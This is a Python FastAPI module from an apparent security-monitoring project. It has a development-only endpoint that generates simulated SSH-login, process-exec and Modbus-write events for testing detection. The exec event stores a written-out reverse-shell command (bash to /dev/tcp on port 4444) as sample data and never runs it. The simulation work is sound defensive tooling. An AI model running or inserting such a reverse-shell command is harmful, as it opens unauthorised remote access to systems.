"""Development-only endpoints for simulated telemetry emission.

DEV ONLY: Dev-only test-event endpoint. Remove before demo.
"""

import json
import random
import sqlite3
from datetime import UTC, datetime
from typing import Annotated

from fastapi import APIRouter, Depends
from sentinelx.schemas.common import Domain, Outcome, SourceTool, WSMessage, new_id
from sentinelx.schemas.event import Event, OTFields
from sentinelx.store.sqlite import insert_event

from app.db import get_db
from app.ws import manager

router = APIRouter(prefix="/api/v1/dev", tags=["dev"])


def generate_dev_event() -> Event:
    """Generate a realistic test Event for development inspection."""
    now = datetime.now(UTC)
    event_type = random.choice(["ssh_login", "exec", "modbus_write"])

    if event_type == "ssh_login":
        return Event(
            event_id=new_id("evt"),
            ts=now,
            ingested_at=now,
            source_tool=SourceTool.generic,
            domain=Domain.it,
            category="authentication",
            action="ssh_login",
            outcome=Outcome.success,
            host="workstation-01",
            user="admin",
            src_ip="192.168.1.105",
            dst_ip="192.168.1.20",
            dst_port=22,
            protocol="tcp",
            raw_ref={"source": "dev_generator", "sim": "ssh_login"},
            raw={"auth_method": "publickey", "status": "accepted"},
            tags=["dev-test"],
        )
    elif event_type == "exec":
        return Event(
            event_id=new_id("evt"),
            ts=now,
            ingested_at=now,
            source_tool=SourceTool.generic,
            domain=Domain.it,
            category="process",
            action="exec",
            outcome=Outcome.success,
            host="srv-scada-hmi",
            user="root",
            process="/bin/bash",
            parent_process="/usr/sbin/sshd",
            cmdline="bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
            raw_ref={"source": "dev_generator", "sim": "exec"},
            raw={"pid": 4812, "ppid": 1420},
            tags=["dev-test"],
        )
    else:
        return Event(
            event_id=new_id("evt"),
            ts=now,
            ingested_at=now,
            source_tool=SourceTool.generic,
            domain=Domain.ot,
            category="ot_command",
            action="modbus_write",
            outcome=Outcome.success,
            host="plc-primary-pump",
            src_ip="192.168.20.10",
            dst_ip="192.168.20.100",
            dst_port=502,
            protocol="modbus",
            ot=OTFields(
                unit_id=1,
                device_id="plc-01",
                function_code=16,
                register=40001,
                value=1,
                is_write=True,
            ),
            raw_ref={"source": "dev_generator", "sim": "modbus_write"},
            raw={"function_code": 16, "register": 40001, "val": 1},
            tags=["dev-test"],
        )


@router.post("/emit-test-event", response_model=Event)
async def emit_test_event(
    db: Annotated[sqlite3.Connection, Depends(get_db)],
) -> Event:
    """DEV ONLY: Dev-only test-event endpoint. Remove before demo.

    Emits one realistic-looking test Event (ssh_login, exec, or modbus_write),
    persists it into SQLite, broadcasts it as a WSMessage over WebSockets, and returns it.
    """
    event = generate_dev_event()
    insert_event(db, event)

    ws_message = WSMessage(
        type="event",
        ts=event.ts,
        payload=json.loads(event.model_dump_json()),
    )
    await manager.broadcast(ws_message)
    return event
